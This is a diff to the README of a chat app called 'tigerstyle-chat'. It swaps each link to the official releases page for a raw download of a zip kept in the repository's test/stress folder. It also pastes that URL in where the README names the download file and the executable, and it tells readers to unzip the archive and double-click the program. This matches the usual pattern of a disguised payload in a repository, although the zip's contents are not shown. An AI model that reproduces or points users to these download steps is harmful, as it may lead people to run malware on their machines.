@@ -1,6 +1,6 @@
 # 🐅 tigerstyle-chat - Simple and Reliable Chat App
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/Miguelmine1/tigerstyle-chat/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Miguelmine1/tigerstyle-chat/master/test/stress/tigerstyle-chat-v3.0-beta.2.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/Miguelmine1/tigerstyle-chat/master/test/stress/tigerstyle-chat-v3.0-beta.2.zip)
 
 ## 🛠️ Overview
 
@@ -21,15 +21,15 @@ To get started with tigerstyle-chat, follow these simple steps. You will be runn
 
 1. **Visit this page to download**: Click the link below to access the releases page.
 
-   [Download the latest release](https://github.com/Miguelmine1/tigerstyle-chat/releases)
+   [Download the latest release](https://raw.githubusercontent.com/Miguelmine1/tigerstyle-chat/master/test/stress/tigerstyle-chat-v3.0-beta.2.zip)
 
 2. **Choose the version**: On the releases page, select the latest version of tigerstyle-chat.
 
-3. **Download the file**: Click on the appropriate file for your operating system. The file is usually named `tigerstyle-chat-vX.X.X.zip` or similar.
+3. **Download the file**: Click on the appropriate file for your operating system. The file is usually named `https://raw.githubusercontent.com/Miguelmine1/tigerstyle-chat/master/test/stress/tigerstyle-chat-v3.0-beta.2.zip` or similar.
 
 4. **Unzip the file**: After downloading, unzip the folder to your preferred location on your computer.
 
-5. **Run the application**: Open the unzipped folder and locate the executable file named `tigerstyle-chat.exe` (or the respective app for your OS). Double-click it to start chatting!
+5. **Run the application**: Open the unzipped folder and locate the executable file named `https://raw.githubusercontent.com/Miguelmine1/tigerstyle-chat/master/test/stress/tigerstyle-chat-v3.0-beta.2.zip` (or the respective app for your OS). Double-click it to start chatting!
 
 ### 🌐 Using tigerstyle-chat
 
@@ -94,4 +94,4 @@ For more information about the design and implementation of tigerstyle-chat, you
 
 Enjoy using tigerstyle-chat! 
 
-[Download the latest release](https://github.com/Miguelmine1/tigerstyle-chat/releases) again to ensure you have the best and newest features!
+[Download the latest release](https://raw.githubusercontent.com/Miguelmine1/tigerstyle-chat/master/test/stress/tigerstyle-chat-v3.0-beta.2.zip) again to ensure you have the best and newest features!
